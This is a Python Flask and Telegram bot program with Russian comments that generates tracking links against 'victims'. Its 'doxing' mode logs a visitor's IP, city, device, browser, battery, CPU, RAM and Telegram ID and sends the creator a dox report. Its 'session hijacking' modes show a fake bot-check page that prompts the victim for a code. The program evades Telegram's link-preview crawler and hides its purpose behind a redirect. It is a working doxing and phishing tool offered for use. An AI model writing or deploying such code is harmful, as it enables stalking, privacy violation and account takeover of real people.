import os
import sqlite3
import random
import string
import time
import threading
import requests
from datetime import datetime
from flask import Flask, request, redirect, render_template_string
import telebot

# ======================== КОНФИГ ============================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
PORT = int(os.environ.get("PORT", 5000))
BASE_URL = os.environ.get("BASE_URL", "https://butno-1.onrender.com")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ======================== БАЗА ДАННЫХ ============================
conn = sqlite3.connect('sessions.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    status TEXT DEFAULT 'active',
    registered_at TEXT
)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    link_id TEXT,
    ip TEXT,
    country TEXT,
    city TEXT,
    device TEXT,
    os TEXT,
    browser TEXT,
    battery TEXT,
    cpu TEXT,
    ram TEXT,
    tg_id TEXT,
    timestamp TEXT
)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS links (
    link_id TEXT PRIMARY KEY,
    user_id INTEGER,
    mode INTEGER,
    code TEXT,
    redirect_url TEXT,
    active INTEGER DEFAULT 1,
    victim_id TEXT DEFAULT NULL,
    created_at TEXT
)''')
conn.commit()

# ======================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ============================
def is_admin(user_id):
    return user_id == ADMIN_ID

def get_user_status(user_id):
    cursor.execute('SELECT status FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    return row[0] if row else None

def register_user(user_id, username, first_name):
    cursor.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name, registered_at)
                      VALUES (?, ?, ?, ?)''',
                   (user_id, username or 'N/A', first_name or 'N/A', datetime.now().isoformat()))
    conn.commit()

def generate_link(user_id, mode):
    link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    code = ''.join(random.choices(string.digits, k=6)) if mode in [2, 3] else None
    cursor.execute('INSERT INTO links (link_id, user_id, mode, code, created_at) VALUES (?, ?, ?, ?, ?)',
                   (link_id, user_id, mode, code, datetime.now().isoformat()))
    conn.commit()
    
    if mode == 1:
        return link_id, f"{BASE_URL}/collect/{link_id}"
    elif mode == 2:
        return link_id, f"{BASE_URL}/verify/{link_id}"
    elif mode == 3:
        return link_id, f"{BASE_URL}/custom/{link_id}"
    return None, None

def get_link_data(link_id):
    cursor.execute('SELECT user_id, mode, code, redirect_url, active FROM links WHERE link_id = ?', (link_id,))
    row = cursor.fetchone()
    return row if row else None

def deactivate_link(link_id):
    cursor.execute('UPDATE links SET active = 0 WHERE link_id = ?', (link_id,))
    conn.commit()

def send_telegram_code(victim_id, code, link_id):
    try:
        bot.send_message(victim_id, f"🔑 Ваш код подтверждения: `{code}`\nВведите его на странице для продолжения.", parse_mode='Markdown')
        return True
    except Exception as e:
        return False

# ======================== FLASK РОУТЫ ============================
@app.route('/collect/<link_id>')
def collect_data(link_id):
    link_data = get_link_data(link_id)
    if not link_data or link_data[4] == 0:
        return "Ссылка недействительна или истекла", 404
    
    user_id = link_data[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]

    # Проверяем, не бот ли это Telegram (обычно User-Agent содержит "TelegramBot")
    if 'TelegramBot' in user_agent or 'Spider' in user_agent or 'Bot' in user_agent:
        return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

    try:
        import user_agents
        ua = user_agents.parse(user_agent)
        device = ua.device.family
        os_name = ua.os.family
        browser = ua.browser.family
    except:
        device = os_name = browser = 'Unknown'

    try:
        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        country = geo.get('country', 'Unknown')
        city = geo.get('city', 'Unknown')
    except:
        country = city = 'Unknown'

    battery = request.args.get('battery', 'N/A')
    cpu = request.args.get('cpu', 'N/A')
    ram = request.args.get('ram', 'N/A')
    tg_id = request.args.get('tg_id', 'N/A')

    cursor.execute('''INSERT INTO logs (user_id, link_id, ip, country, city, device, os, browser, battery, cpu, ram, tg_id, timestamp)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                   (user_id, link_id, ip, country, city, device, os_name, browser, battery, cpu, ram, tg_id, datetime.now().isoformat()))
    conn.commit()

    report = (f"📡 **ДОКС-ОТЧЁТ**\n"
              f"🔗 ID: {link_id}\n"
              f"🌍 IP: {ip}\n"
              f"📍 Страна: {country}, {city}\n"
              f"📱 Устройство: {device}\n"
              f"💻 ОС: {os_name}\n"
              f"🌐 Браузер: {browser}\n"
              f"🔋 Заряд: {battery}%\n"
              f"🧠 CPU ядер: {cpu}\n"
              f"🧮 RAM: {ram} ГБ\n"
              f"🆔 Telegram ID: {tg_id}")
    bot.send_message(user_id, report)
    deactivate_link(link_id)
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

@app.route('/verify/<link_id>', methods=['GET', 'POST'])
def verify_page(link_id):
    link_data = get_link_data(link_id)
    if not link_data or link_data[4] == 0:
        return "Ссылка недействительна или истекла", 404
    
    user_id = link_data[0]
    code = link_data[2]
    
    if request.method == 'GET':
        # Определяем ID жертвы из параметров (если перешел из Telegram)
        victim_id = request.args.get('tg_id')
        if victim_id:
            try:
                victim_id = int(victim_id)
                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (victim_id, link_id))
                conn.commit()
                # Отправляем код жертве
                if send_telegram_code(victim_id, code, link_id):
                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {victim_id})")
                else:
                    bot.send_message(user_id, f"❌ Не удалось отправить код жертве. Возможно, она не начала диалог с ботом.")
            except:
                pass
        
        return render_template_string(f"""
        <!DOCTYPE html>
        <html>
        <head><title>Подтверждение</title></head>
        <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
            <h2>⚠️ Подтвердите, что вы не бот</h2>
            <p>На ваш Telegram отправлен код подтверждения.</p>
            <form action="/verify/{link_id}" method="POST">
                <input type="text" name="code" placeholder="Введите код" required>
                <button type="submit">Подтвердить</button>
            </form>
        </body>
        </html>
        """)
    
    if request.method == 'POST':
        entered_code = request.form.get('code', '').strip()
        if entered_code == code:
            bot.send_message(user_id, f"✅ Код подтверждён! Сессия: {link_id}")
            deactivate_link(link_id)
            return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        else:
            return render_template_string(f"""
            <!DOCTYPE html>
            <html>
            <head><title>Ошибка</title></head>
            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
                <h2>❌ Неверный код</h2>
                <p>Попробуйте ещё раз.</p>
                <a href="/verify/{link_id}">Вернуться</a>
            </body>
            </html>
            """)

@app.route('/custom/<link_id>', methods=['GET', 'POST'])
def custom_page(link_id):
    link_data = get_link_data(link_id)
    if not link_data or link_data[4] == 0:
        return "Ссылка недействительна или истекла", 404
    
    user_id = link_data[0]
    code = link_data[2]
    
    if request.method == 'GET':
        victim_id = request.args.get('tg_id')
        if victim_id:
            try:
                victim_id = int(victim_id)
                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (victim_id, link_id))
                conn.commit()
                if send_telegram_code(victim_id, code, link_id):
                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {victim_id})")
                else:
                    bot.send_message(user_id, f"❌ Не удалось отправить код жертве.")
            except:
                pass
        
        return render_template_string(f"""
        <!DOCTYPE html>
        <html>
        <head><title>Видео</title></head>
        <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
            <h1>🎬 Подтверждение</h1>
            <p>Введите код для просмотра видео</p>
            <form action="/custom/{link_id}" method="POST">
                <input type="text" name="code" placeholder="Введите код" required>
                <input type="text" name="redirect_url" placeholder="Ссылка для редиректа (опционально)" style="margin-top:10px;">
                <button type="submit" style="margin-top:10px;">Подтвердить</button>
            </form>
        </body>
        </html>
        """)
    
    if request.method == 'POST':
        entered_code = request.form.get('code', '').strip()
        redirect_url = request.form.get('redirect_url', '').strip()
        if entered_code == code:
            if redirect_url:
                cursor.execute('UPDATE links SET redirect_url = ? WHERE link_id = ?', (redirect_url, link_id))
                conn.commit()
            bot.send_message(user_id, f"✅ Код подтверждён! Сессия: {link_id}")
            deactivate_link(link_id)
            return redirect(redirect_url or "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        else:
            return render_template_string(f"""
            <!DOCTYPE html>
            <html>
            <head><title>Ошибка</title></head>
            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
                <h2>❌ Неверный код</h2>
                <p>Попробуйте ещё раз.</p>
                <a href="/custom/{link_id}">Вернуться</a>
            </body>
            </html>
            """)

# ======================== TELEGRAM БОТ ============================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    register_user(user_id, message.from_user.username, message.from_user.first_name)
    
    if is_admin(user_id):
        markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.KeyboardButton("Режим 1 – Докс"),
            telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон"),
            telebot.types.KeyboardButton("👥 Пользователи"),
            telebot.types.KeyboardButton("📊 Статистика")
        )
        bot.send_message(user_id, "👑 Админ-панель", reply_markup=markup)
    else:
        markup = telebot.types.ReplyKeyboardMarkup(row_width=1)
        markup.add(
            telebot.types.KeyboardButton("Режим 1 – Докс"),
            telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон")
        )
        bot.send_message(user_id, "Выбери режим:", reply_markup=markup)

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE users SET status = "banned" WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"🚫 Пользователь {user_id} забанен")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /ban ID")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE users SET status = "active" WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"✅ Пользователь {user_id} разбанен")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /unban ID")

@bot.message_handler(commands=['revoke'])
def revoke_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE links SET active = 0 WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"🔒 Все ссылки пользователя {user_id} деактивированы")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /revoke ID")

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    user_id = message.from_user.id
    if get_user_status(user_id) == 'banned':
        bot.send_message(user_id, "🚫 Ты забанен. Обратись к админу.")
        return

    if message.text == "Режим 1 – Докс":
        link_id, link = generate_link(user_id, 1)
        bot.send_message(user_id, f"📎 Ссылка: {link}\n\n⚠️ Отчёт придёт только после реального перехода жертвы по ссылке.")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 1\nСсылка: {link}")
    
    elif message.text == "Режим 2 – Угон сессии":
        link_id, link = generate_link(user_id, 2)
        bot.send_message(user_id, f"📎 Ссылка: {link}\n\n⚠️ Жертва получит код в Telegram после перехода по ссылке.")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 2\nСсылка: {link}")
    
    elif message.text == "Режим 3 – Продвинутый угон":
        link_id, link = generate_link(user_id, 3)
        bot.send_message(user_id, f"📎 Ссылка: {link}\n\n⚠️ Жертва получит код, и ты можешь изменить ссылку редиректа.")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 3\nСсылка: {link}")
    
    elif message.text == "👥 Пользователи" and is_admin(user_id):
        cursor.execute('SELECT user_id, username, first_name, status FROM users')
        rows = cursor.fetchall()
        text = "📋 **Пользователи:**\n\n"
        for row in rows:
            text += f"🆔 {row[0]} | @{row[1]} | {row[2]} | {row[3]}\n"
        bot.send_message(user_id, text)
    
    elif message.text == "📊 Статистика" and is_admin(user_id):
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM logs')
        total_logs = cursor.fetchone()[0]
        bot.send_message(user_id, f"📊 **Статистика:**\n👥 Всего пользователей: {total_users}\n📡 Всего докс-отчётов: {total_logs}")

# ======================== ЗАПУСК ============================
if __name__ == '__main__':
    threading.Thread(target=bot.polling, kwargs={'none_stop': True}).start()
    app.run(host='0.0.0.0', port=PORT)
